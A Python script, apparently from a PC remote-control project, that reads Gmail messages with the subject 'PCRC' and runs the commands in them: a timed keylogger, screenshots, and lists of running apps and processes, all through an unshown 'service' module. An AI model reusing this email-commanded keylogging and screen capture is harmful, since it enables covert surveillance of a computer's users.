from __future__ import print_function

import os.path
import base64
import service

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

from ..gmail_api import readMails, sendMail

# If modifying these scopes, delete the file token.json.
SCOPES = ["https://mail.google.com/"]

def handle(myAr):
    print("Handling Mail")
    import re
    # Define the pattern using regular expression
    pattern = re.compile(r"^\[key_logger-(\d|\d\d|\d\d\d)\]$")
    for task in myAr:
        # Use the pattern to search for matches in the string
        match = pattern.match(task)
        if match:
            service.keylogger( int( match.group(1) ) )
        elif task == "[screen_capture]":
            service.screenshot()
        elif task == "[list_apps]":
            service.listRunningApplication()
        elif task == "[list_processes]":
            service.listRunningProcess()


# def testoutput():
#     print("hello may cau")

def send():
    sendMail(receiver='')

def CheckMail(creds):
    myMsgs = readMails(Creds=creds, Service=None, sbj_mail='PCRC')
    handle(myMsgs)

def main():
    creds = None
    # The file token.json stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists("token.json"):
        creds = Credentials.from_authorized_user_file("token.json", SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file("credentials.json", SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open("token.json", "w") as token:
            token.write(creds.to_json())

    return creds


if __name__ == "__main__":
    main()
